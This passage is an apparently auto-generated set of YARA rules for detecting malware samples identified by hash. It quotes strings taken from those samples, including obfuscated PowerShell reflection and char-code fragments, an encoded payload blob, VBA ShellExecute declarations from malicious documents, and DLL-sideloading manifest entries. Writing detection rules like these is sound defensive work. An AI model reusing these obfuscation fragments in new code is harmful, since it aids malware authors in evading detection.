      $s10 = "//Geylies! angeleen? extramoral eksplosionsmotors cellulosefabrikkernes; tautegory126 waget; lskbende, hydrops toxins! blodstyrt" ascii /* score: '19.00'*/
      $s11 = "//Islnderen? swordlet brahminists: telegrafers, typewriters! antidicomarian? skraaleriers bepill163; amphoricity? headlines! bje" ascii /* score: '19.00'*/
      $s12 = "rgstat, systemprogrammrerne: samlemapperne fichuet173; konkurrencehensyn. paaskriv. filesave produktionsdatabasen circumstancing" ascii /* score: '19.00'*/
      $s13 = "//Anholder? erotiserer canards. scuse: brintionen synkretiske pitchdarkness! brystoperationer chlortetracycline. resultatfils af" ascii /* score: '19.00'*/
      $s14 = "//Skkebaandet jillies multimetre rundkirker summeret barbadier, skifferolier; glisteringly graceful, stotter? overplayed! regnsk" ascii /* score: '19.00'*/
      $s15 = "//Hypostasised. ankestyrelsen. telegraphoscope! disaccharides, tagpaps funktionslederne, sagomraader, uninjectable postpharyngea" ascii /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 800KB and ( 8 of them )
      ) or ( all of them )
}

rule _40ab50289f7ef5fae60801f88d4541fc_imphash__ad63e142_40ab50289f7ef5fae60801f88d4541fc_imphash__f210d1ce_7 {
   meta:
      description = "_subset_batch - from files 40ab50289f7ef5fae60801f88d4541fc(imphash)_ad63e142.exe, 40ab50289f7ef5fae60801f88d4541fc(imphash)_f210d1ce.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ad63e142e9ce26a34000880bb13896bfeb09f640c9465dc29744e7019d62f002"
      hash2 = "f210d1ce32df55a132d02ca0f7c9d44a7249c15f331d119a06783585205a390e"
   strings:
      $x1 = "<file name=\"version.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $x2 = "<file name=\"comctl32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $x3 = "<file name=\"winhttp.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $s4 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s5 = "<file name=\"mpr.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s6 = "<file name=\"netutils.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s7 = "<file name=\"textshaping.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s8 = "FHeaderProcessed" fullword ascii /* score: '20.00'*/
      $s9 = "FExecuteAfterTimestamp" fullword ascii /* score: '18.00'*/
      $s10 = "OnExecutexAF" fullword ascii /* score: '18.00'*/
      $s11 = "For more detailed information, please visit https://jrsoftware.org/ishelp/index.php?topic=setupcmdline" fullword wide /* score: '18.00'*/
      $s12 = "7VAR and OUT arguments must match parameter type exactly\"%s (Version %d.%d, Build %d, %5:s):%s Service Pack %4:d (Version %1:d." wide /* score: '15.50'*/
      $s13 = "BTDictionary<System.string,System.TypInfo.PTypeInfo>.TKeyEnumeratord" fullword ascii /* score: '15.00'*/
      $s14 = "TComponent.GetObservers$ActRec" fullword ascii /* score: '15.00'*/
      $s15 = "AppMutex" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and pe.imphash() == "40ab50289f7ef5fae60801f88d4541fc" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _566c10337f70fdbbf81f890c82c2994ea3c227febaa0c1287bdef50b77efa478_566c1033_644bd60b6feb75109dc8a2ec58bef1399cf605c19322a362b_8 {
   meta:
      description = "_subset_batch - from files 566c10337f70fdbbf81f890c82c2994ea3c227febaa0c1287bdef50b77efa478_566c1033.unknown, 644bd60b6feb75109dc8a2ec58bef1399cf605c19322a362b0412a35c8ebc06a_644bd60b.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "566c10337f70fdbbf81f890c82c2994ea3c227febaa0c1287bdef50b77efa478"
      hash2 = "644bd60b6feb75109dc8a2ec58bef1399cf605c19322a362b0412a35c8ebc06a"
   strings:
      $s1 = "2124753349" ascii /* score: '17.00'*/ /* hex encoded string '!$u3I' */
      $s2 = "3553732573" ascii /* score: '17.00'*/ /* hex encoded string '5Ss%s' */
      $s3 = "elseif(((((47*49*41)*35*35-28+13-8*(5*35+26)+38+46*38)-(115668298))) -eq (($loGHsyW-36-$SkmpFNQ)-$XQMgeklTLSb+45+12-43-30+$zXDZV" ascii /* score: '13.00'*/
      $s4 = "elseif((((((8*46+(45-30+(25*36+48)))))-(1328))) -ne ((($nzpDrQXTqyvaI+3-41))+(41+9+45)-4-43+$yJtfTpLrHGm+27-32+36-$KyBFdUnk-5+3)" ascii /* score: '13.00'*/
      $s5 = "elseif(((((47*49*41)*35*35-28+13-8*(5*35+26)+38+46*38)-(115668298))) -eq (($loGHsyW-36-$SkmpFNQ)-$XQMgeklTLSb+45+12-43-30+$zXDZV" ascii /* score: '13.00'*/
      $s6 = "elseif((((((8*46+(45-30+(25*36+48)))))-(1328))) -ne ((($nzpDrQXTqyvaI+3-41))+(41+9+45)-4-43+$yJtfTpLrHGm+27-32+36-$KyBFdUnk-5+3)" ascii /* score: '13.00'*/
      $s7 = "int]$aCptNTKrbofiEx + [char][int]$TqSFZ + [char][int]$BvjAfmXsHnEqWi + [char][int]$ZvgQBfp + [char][int]$gclIPy + [char][int]$dk" ascii /* score: '12.00'*/
      $s8 = "$XjtKVFxB = ([char][int]$rVklPhFRJKjDM + [char][int]$VxnLJb + [char][int]$xIrZeFHynqY + [char][int]$BTsQN + [char][int]$iQrhjkGe" ascii /* score: '12.00'*/
      $s9 = "while ((($mSWCMHlrAsh-3-$qFxQfcCu)-(7-47-20)+$IsPUuCMdTJ-13+($CcpHdLWVv+18+$qHmDGyj)-(($QNCiMrH-34-36))) -ge (((14-4*7)+31+30*43" ascii /* score: '11.00'*/
      $s10 = "elseif((((49-40+(35-18+21)))+(49+30-$xCLebUl)-(($rEPNklTf-38+$TVOwjkqMKc+$IsPUuCMdTJ+36-45))) -eq (((18*38+22)+(19*39-35)-46+48+" ascii /* score: '11.00'*/
      $s11 = "($CiLBPwTmpq -as [Type]).($PzAgqHMokRYyKF).($DuodStV)($iaZvLdWEDGw).($DkVKSj)($WyLsBwYlTxQp,$XjtKVFxB).($UxQfWPhBC)($null,([int]" ascii /* score: '11.00'*/
      $s12 = "elseif((($IyZoQlWRUmiOaK+47+$IsPUuCMdTJ)-$qFxQfcCu-36+$uxwmL+(($SkmpFNQ-43+27))) -ge ((((49*41+29*14+35+14))+((20+11*(47*40+35))" ascii /* score: '11.00'*/
      $s13 = "elseif((((49-40+(35-18+21)))+(49+30-$xCLebUl)-(($rEPNklTf-38+$TVOwjkqMKc+$IsPUuCMdTJ+36-45))) -eq (((18*38+22)+(19*39-35)-46+48+" ascii /* score: '11.00'*/
      $s14 = "$estrif = ($CiLBPwTmpq -as [Type]).($PzAgqHMokRYyKF).($DuodStV)($iaZvLdWEDGw).($zDZpVUT)($iHNbtezPK, ($SGqnLdvltjH -as [Type])::" ascii /* score: '11.00'*/
      $s15 = "($CiLBPwTmpq -as [Type]).($PzAgqHMokRYyKF).($DuodStV)($iaZvLdWEDGw).($DkVKSj)($WyLsBwYlTxQp,$XjtKVFxB).($UxQfWPhBC)($null,([int]" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x4224 and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _20d97dd345195edee4fbcfe4b675aa3cab15fc056ab7740b0fc49f65f59bff76_20d97dd3_6f8ab12bb79c59113a6bc65f4a6cedfe13afd1a0bff5c5f8e_9 {
   meta:
      description = "_subset_batch - from files 20d97dd345195edee4fbcfe4b675aa3cab15fc056ab7740b0fc49f65f59bff76_20d97dd3.ps1, 6f8ab12bb79c59113a6bc65f4a6cedfe13afd1a0bff5c5f8e1ba5ca8767c02c5_6f8ab12b.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "20d97dd345195edee4fbcfe4b675aa3cab15fc056ab7740b0fc49f65f59bff76"
      hash2 = "6f8ab12bb79c59113a6bc65f4a6cedfe13afd1a0bff5c5f8e1ba5ca8767c02c5"
   strings:
      $s1 = "AAAAAICFA0UAEyEugEJAACAAAAAAMFwfhUHIRCAgAAAAAAATBsnT5CglAAAAAMFcAwUA7BBLAYJAAAAARBDAMFweVUJAWCAAAAAUQBATBsnH2CglAAAAA8EmAwUA7ZQ6" ascii /* score: '17.00'*/
      $s2 = "AAAAAAAAAABAA" ascii /* base64 encoded string '        @' */ /* score: '16.50'*/
      $s3 = "AAAAAAAAAABAAE" ascii /* base64 encoded string '        @ ' */ /* score: '16.50'*/
      $s4 = "BAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '               ' */ /* score: '16.50'*/
      $s5 = "AAAAAEAAAEAAAA" ascii /* base64 encoded string '    @  @  ' */ /* score: '16.50'*/
      $s6 = "AEBAAAAAAA" ascii /* base64 encoded string ' @@    ' */ /* score: '16.50'*/
      $s7 = "AAAAAAAAAAAAAAABAAAAA" ascii /* base64 encoded string '           @   ' */ /* score: '16.50'*/
      $s8 = "AEAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' @          ' */ /* score: '16.50'*/
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ' */ /* score: '16.50'*/
      $s10 = "AAAAAAEBAAAA" ascii /* base64 encoded string '    @@  ' */ /* score: '16.50'*/
      $s11 = "DAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '            ' */ /* score: '16.50'*/
      $s12 = "AAAAAAAAAABAAEA" ascii /* base64 encoded string '        @ @' */ /* score: '16.50'*/
      $s13 = "UhVRU91UJBQN6p0cIFkMmdGcJBQN6RzbAUTesNEA1E3dBJmQvRDA1omcBNXchd3aAUDZSR1SnBQNixEA1kVYthGN4kGUqBQNUxEc3kTcLhGA1A1bAUzTwt2YFZFMwBQN" ascii /* score: '16.00'*/
      $s14 = "ZMGABAQPaMFABMADqgBABgwAm4DABggpbwGABggbaIDABEQXZcHABgwAU8CgWhwAQIJgWhwANMMgWhwAIEIgWhwAKgEgWhwAJdMgWhwAJlOgWhwAJZNgWhwAJwGgWhwA" ascii /* score: '16.00'*/
      $s15 = "zQnbJ9GVAIzM05WSkFWZSBgMzQnbJV1bUBgMzIXZzVHAyMjbpdlL0Z2bz9mcjlWTAIzMsVmbyV2aAIzMpBXY2RWQAITM1EESTNUQNhEAyADOztUatBgMtYWMxADMwYDe" ascii /* score: '16.00'*/
   condition:
      ( uint16(0) == 0x3d3d and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1dbc7738d8ad1e6b79048c0e4a9066ae_imphash__6d4ab1032f66fc4fe8d72b1c468e1469_imphash__799e73863806df2964d80d12ce4e61ea_imphas_10 {
   meta:
      description = "_subset_batch - from files 1dbc7738d8ad1e6b79048c0e4a9066ae(imphash).exe, 6d4ab1032f66fc4fe8d72b1c468e1469(imphash).exe, 799e73863806df2964d80d12ce4e61ea(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "fb488e45a6338697d70301557cad14b110880f6838023b44d0125759123c4449"
      hash2 = "ecb3a597d17244e2fadec4590a6b492f362095ffc5eb6ee58624be766c69fc82"
      hash3 = "9bab404584f6a0d9d82112d6e017cfa37d0094d97e510101d6a0132fd145dd32"
   strings:
      $x1 = "JSystem.Private.StackTraceMetadata.dll2System.Private.TypeLoader" fullword ascii /* score: '31.00'*/
      $x2 = "NSystem.Private.Reflection.Execution.dllBSystem.Private.StackTraceMetadata" fullword ascii /* score: '31.00'*/
      $s3 = "4System.Private.CoreLib.dll" fullword ascii /* score: '29.00'*/
      $s4 = "The current thread attempted to reacquire a mutex that has reached its maximum acquire count" fullword wide /* score: '25.00'*/
      $s5 = "System.Collections.Generic.IEnumerable<System.Runtime.Loader.LibraryNameVariation>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s6 = "Format of the executable (.exe) or library (.dll) is invalid" fullword wide /* score: '24.00'*/
      $s7 = "mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '21.00'*/
      $s8 = "The specified TaskContinuationOptions combined LongRunning and ExecuteSynchronously.  Synchronous continuations should not be lo" wide /* score: '21.00'*/
      $s9 = "6GetCurrentProcessorNumberEx" fullword ascii /* score: '20.00'*/
      $s10 = ".SplitWithPostProcessing@" fullword ascii /* score: '20.00'*/
      $s11 = "4SplitWithoutPostProcessing@" fullword ascii /* score: '20.00'*/
      $s12 = "Microsoft.Extensions.DependencyInjection.VerifyOpenGenericServiceTrimmability" fullword ascii /* score: '20.00'*/
      $s13 = "System.Runtime.CompilerServices.RuntimeFeature.IsDynamicCodeSupported" fullword ascii /* score: '20.00'*/
      $s14 = "Attempted to perform an unauthorized operation" fullword wide /* score: '19.00'*/
      $s15 = "Collection was modified; enumeration operation may not execute" fullword wide /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _05b423aa13a0c7c54219288431b75815f50650d6c13bc44a7fdd7b38691c40f9_05b423aa_1a3f0fa9d62a3de2d9ffe66b20ee4d58e4c5827ba6db01adb_11 {
   meta:
      description = "_subset_batch - from files 05b423aa13a0c7c54219288431b75815f50650d6c13bc44a7fdd7b38691c40f9_05b423aa.doc, 1a3f0fa9d62a3de2d9ffe66b20ee4d58e4c5827ba6db01adbe4aa63c410506bd_1a3f0fa9.doc"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "05b423aa13a0c7c54219288431b75815f50650d6c13bc44a7fdd7b38691c40f9"
      hash2 = "1a3f0fa9d62a3de2d9ffe66b20ee4d58e4c5827ba6db01adbe4aa63c410506bd"
   strings:
      $x1 = " Private Declare Function ShellExec Lib \"shell32.dll\" Alias \"ShellExecuteA\" (ByVal hWnd As Long, ByVal pOperation As String," ascii /* score: '41.00'*/
      $x2 = " Private Declare Function ShellExec Lib \"shell32.dll\" Alias \"ShellExecuteA\" (ByVal hWnd As Long, ByVal pOperation As String," ascii /* score: '41.00'*/
      $s3 = "*\\G{737846DB-4783-44CC-AC63-A08197D8852A}#2.0#0#C:\\Users\\MAYURE~1.BEH\\AppData\\Local\\Temp\\VBE\\MSForms.exd#Microsoft Forms" wide /* score: '30.00'*/
      $s4 = "<DocumentData><TagData>19`Card/Account Type^Platinum Charge Card`Claim Loss Date^11 May 2025`Claim Reference Number^5150341687`C" ascii /* score: '28.00'*/
      $s5 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.5#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE14\\MSO.DLL#Micr" wide /* score: '28.00'*/
      $s6 = "*\\G{3F4DACA7-160D-11D2-A8E9-00104B365C9F}#5.5#0#C:\\Windows\\SysWOW64\\vbscript.dll\\3#Microsoft VBScript Regular Expressions 5" wide /* score: '24.00'*/
      $s7 = "*\\G{0D452EE1-E08F-101A-852E-02608C4D0BB4}#2.0#0#C:\\Windows\\SysWOW64\\FM20.DLL#Microsoft Forms 2.0 Object Library" fullword wide /* score: '22.00'*/
      $s8 = "Y</TemplateEditable><TemplateUrl><![CDATA[]]></TemplateUrl><FileNoteUrl><![CDATA[https://apclaims.aceins.com/AP_PROD/AFS.Claims/" ascii /* score: '21.00'*/
      $s9 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.1#9#C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA7\\VBE7.DLL#Visual Basic For Applicat" wide /* score: '21.00'*/
      $s10 = "       Call objChrome.ShellExecute(\"chrome.exe\", VBA.Chr(34) & sNavigateURL & VBA.Chr(34), \"\", \"\", 1)" fullword ascii /* score: '20.00'*/
      $s11 = " Private Declare Function GetSystemDirectory Lib \"kernel32\" Alias \"GetSystemDirectoryA\" (ByVal lpBuffer As String, ByVal nSi" ascii /* score: '20.00'*/
      $s12 = " Private Declare Function GetSystemDirectory Lib \"kernel32\" Alias \"GetSystemDirectoryA\" (ByVal lpBuffer As String, ByVal nSi" ascii /* score: '20.00'*/
      $s13 = "*  Serves as a structure to group together a value and an associated key." fullword ascii /* score: '20.00'*/
      $s14 = "*  DESCRIPTIONthro" fullword ascii /* score: '18.00'*/
      $s15 = "*  See Pair.cls for information on user defined pair." fullword ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _4bbbcec5b0a32140e0a4c2abccc2ec8c2042f4b3adb83668b8b04ec596fb6625_4bbbcec5_5396554a09568b449fae0db842bd6fa8f26d9c2ece940a645_12 {
   meta:
      description = "_subset_batch - from files 4bbbcec5b0a32140e0a4c2abccc2ec8c2042f4b3adb83668b8b04ec596fb6625_4bbbcec5.js, 5396554a09568b449fae0db842bd6fa8f26d9c2ece940a645034203791e24705_5396554a.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "4bbbcec5b0a32140e0a4c2abccc2ec8c2042f4b3adb83668b8b04ec596fb6625"
      hash2 = "5396554a09568b449fae0db842bd6fa8f26d9c2ece940a645034203791e24705"
   strings:
      $s1 = "//Koggerne spildevandstilladelsens moebler dumpekaraktererne: phytosociologist." fullword ascii /* score: '19.00'*/
      $s2 = "//Surveyed? ssterselskabs; extempory" fullword ascii /* score: '16.00'*/
      $s3 = "//Filmforestillingerne. circumscriptly; kapur luminophor:" fullword ascii /* score: '15.00'*/
      $s4 = "//Brunelles hypsometer! reube183; fluorinated commandrie:" fullword ascii /* score: '15.00'*/
      $s5 = "//Accounted finansselskab? tilvirkedes tempters hderligheders" fullword ascii /* score: '14.00'*/
      $s6 = "//Indfjnings119 krediteringens valget: katalogisvbr" fullword ascii /* score: '14.00'*/
      $s7 = "//Elevatorskakts antineutral: theologizer scension! ungorge" fullword ascii /* score: '14.00'*/
      $s8 = "//Saanings moveably! logget tontinernes:" fullword ascii /* score: '14.00'*/
      $s9 = "//Integrating abnormalizes240; diamantoid wickiups192? shellycoat" fullword ascii /* score: '12.00'*/
      $s10 = "//Hawkeye! romancelet," fullword ascii /* score: '12.00'*/
      $s11 = "//Pudderne tenorfljters? computerteknologien?" fullword ascii /* score: '12.00'*/
      $s12 = "//Hypostatises: translatr. yomas114 bismervgtene keyserlick" fullword ascii /* score: '12.00'*/
      $s13 = "Aspirationskeurb = Aspirationskeurb - 5464054;" fullword ascii /* score: '12.00'*/
      $s14 = "//Trilogic? outbanning becomes badenes urethralgia:" fullword ascii /* score: '12.00'*/
      $s15 = "//Vadestedet! shaveres! connach; tempergodsets nondichogamous!" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _08fd62a9d05cc8111782017958ea975d_imphash__08fd62a9d05cc8111782017958ea975d_imphash__e32d6b2b_13 {
   meta:
      description = "_subset_batch - from files 08fd62a9d05cc8111782017958ea975d(imphash).exe, 08fd62a9d05cc8111782017958ea975d(imphash)_e32d6b2b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "497ed5bca59fa6c01f80d55c5f528a40daff4e4afddfbe58dbd452c45d4866a3"
      hash2 = "e32d6b2b38b11db56ae5bce0d5e5413578a62960aa3fab48553f048c4d5f91f0"
   strings:
      $s1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"amd64\" " ascii /* score: '29.00'*/
      $s2 = "<requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivil" ascii /* score: '23.00'*/
      $s3 = "<requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivil" ascii /* score: '23.00'*/
      $s4 = "sfxelevation" fullword wide /* score: '20.00'*/
      $s5 = "7ZSfxMod_x64.exe" fullword wide /* score: '19.00'*/
      $s6 = "Error in command line:" fullword ascii /* score: '15.00'*/
      $s7 = " 7-Zip - Copyright (c) 1999-2011 " fullword ascii /* score: '14.00'*/
      $s8 = "SFX module - Copyright (c) 2005-2012 Oleg Scherbakov" fullword ascii /* score: '14.00'*/
      $s9 = " - Copyright (c) 2005-2012 " fullword ascii /* score: '14.00'*/
      $s10 = "7-Zip archiver - Copyright (c) 1999-2011 Igor Pavlov" fullword ascii /* score: '14.00'*/
      $s11 = "SfxVarSystemPlatform" fullword wide /* score: '14.00'*/
      $s12 = "SfxVarCmdLine1" fullword wide /* score: '13.00'*/
      $s13 = "SfxVarCmdLine2" fullword wide /* score: '13.00'*/
      $s14 = "SfxVarCmdLine0" fullword wide /* score: '13.00'*/
      $s15 = "The archive is corrupted, or invalid password was entered." fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "08fd62a9d05cc8111782017958ea975d" and ( 8 of them )
      ) or ( all of them )
}

rule _6d4ab1032f66fc4fe8d72b1c468e1469_imphash__799e73863806df2964d80d12ce4e61ea_imphash__14 {
   meta:
      description = "_subset_batch - from files 6d4ab1032f66fc4fe8d72b1c468e1469(imphash).exe, 799e73863806df2964d80d12ce4e61ea(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ecb3a597d17244e2fadec4590a6b492f362095ffc5eb6ee58624be766c69fc82"
      hash2 = "9bab404584f6a0d9d82112d6e017cfa37d0094d97e510101d6a0132fd145dd32"
   strings:
      $x1 = "System.ComponentModel.Design.IDesigner, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e08" fullword wide /* score: '34.00'*/
      $x2 = "System.Diagnostics.Design.ProcessModuleDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3" ascii /* score: '32.00'*/
      $x3 = "System.Diagnostics.Design.ProcessModuleDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3" ascii /* score: '32.00'*/
      $x4 = "System.Diagnostics.Design.ProcessDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '32.00'*/
      $x5 = "<System.Diagnostics.Process.dll" fullword ascii /* score: '31.00'*/
      $x6 = "System.Linq.dllFSystem.Private.Reflection.Execution" fullword ascii /* score: '31.00'*/
      $s7 = "LSystem.Diagnostics.FileVersionInfo.dll4System.Diagnostics.Process" fullword ascii /* score: '30.00'*/
      $s8 = ":System.Private.TypeLoader.dll8System.Security.Cryptography" fullword ascii /* score: '28.00'*/
      $s9 = "System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089g" fullword ascii /* score: '27.00'*/
      $s10 = "System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s11 = "BSystem.Collections.NonGeneric.dll@System.ComponentModel.Primitives" fullword ascii /* score: '25.00'*/
      $s12 = "TargetvM:System.Security.Cryptography.CryptoConfigForwarder.#cctor" fullword ascii /* score: '25.00'*/
      $s13 = "DeleteTimerXSystem.Threading.IThreadPoolWorkItem.Execute" fullword ascii /* score: '25.00'*/
      $s14 = "System.Collections.Generic.IEnumerator<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericMethodEntry>.get_Current@" fullword ascii /* score: '24.00'*/
      $s15 = "System.Collections.Generic.IEnumerable<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericMethodEntry>.GetEnumerator@" fullword ascii /* score: '24.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _4035d2883e01d64f3e7a9dccb1d63af5_imphash__4035d2883e01d64f3e7a9dccb1d63af5_imphash__30344db9_15 {
   meta:
      description = "_subset_batch - from files 4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, 4035d2883e01d64f3e7a9dccb1d63af5(imphash)_30344db9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "931651b9bbcb39eca9b48f5a4b733d949248ed09e1d239f9150c336480d9a973"
      hash2 = "30344db9ed508306a213aeae8762cff8789eac9501632c6b35de82586acba07c"
   strings:
      $x1 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=" ascii /* score: '61.00'*/
      $x2 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWCreateProcessAsUserWCryptAcq" ascii /* score: '58.00'*/
      $x3 = "unknown pcws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= heap_live= idleprocs= in status  mallocing= ms clock" ascii /* score: '47.00'*/
      $x4 = " > (den<<shift)/2unreserving unaligned region45474735088646411895751953125Central America Standard TimeCentral Pacific Standard " ascii /* score: '46.00'*/
      $x5 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Central Brazilian Standard TimeMoun" ascii /* score: '44.50'*/
      $x6 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '44.00'*/
      $x7 = "bytes.Buffer: UnreadByte: previous operation was not a successful readtoo many concurrent operations on a single file or socket " ascii /* score: '44.00'*/
      $x8 = "152587890625762939453125Bidi_ControlErrUnknownPCGetAddrInfoWGetConsoleCPGetLastErrorGetLengthSidGetStdHandleGetTempPathWJoin_Con" ascii /* score: '44.00'*/
      $x9 = "structure needs cleaningzlib: invalid dictionary bytes failed with errno= to unused region of span with too many arguments 29103" ascii /* score: '35.00'*/
      $x10 = "rmask.lockentersyscallblockexec format errorg already scannedglobalAlloc.mutexinvalid bit size locked m0 woke upmark - bad statu" ascii /* score: '33.00'*/
      $x11 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdontneedmheapSpe" ascii /* score: '33.00'*/
      $x12 = "476837158203125<invalid Value>ASCII_Hex_DigitCreateHardLinkWDeviceIoControlDuplicateHandleFailed to find Failed to load FlushVie" ascii /* score: '32.00'*/
      $s13 = "-struct typeruntime: VirtualQuery failed; errno=runtime: bad notifyList size - sync=runtime: invalid pc-encoded table f=runtime:" ascii /* score: '30.00'*/
      $s14 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '30.00'*/
      $s15 = "mstartbad sequence numberbad value for fieldbinary.LittleEndiandevice not a streamdirectory not emptydisk quota exceededdodeltim" ascii /* score: '30.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and pe.imphash() == "4035d2883e01d64f3e7a9dccb1d63af5" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94_0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e_16 {
   meta:
      description = "_subset_batch - from files 084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94.elf, 0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b_0f50ae3b.elf, 2ffcc53d165f90cad66a29a16bea365d(imphash)_56e695fc.exe, 33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d.elf, 36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed_36bf2503.elf, 37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d_37c14ac6.elf, 44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48_44c6fbea.elf, 7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c_7b2f554d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba"
      hash2 = "0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b"
      hash3 = "56e695fc1a6295569036a0777d81b5d572962a82d6d4a5209741ff957337c8e3"
      hash4 = "33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c"
      hash5 = "36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed"
      hash6 = "37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d"
      hash7 = "44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48"
      hash8 = "7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c"
   strings:
      $x1 = "  consultationcommunity ofthe nationalit should beparticipants align=\"leftthe greatestselection ofsupernaturaldependent onis me" ascii /* score: '35.00'*/
      $s2 = "keywords\" content=\"w3.org/1999/xhtml\"><a target=\"_blank\" text/html; charset=\" target=\"_blank\"><table cellpadding=\"autoc" ascii /* score: '28.00'*/
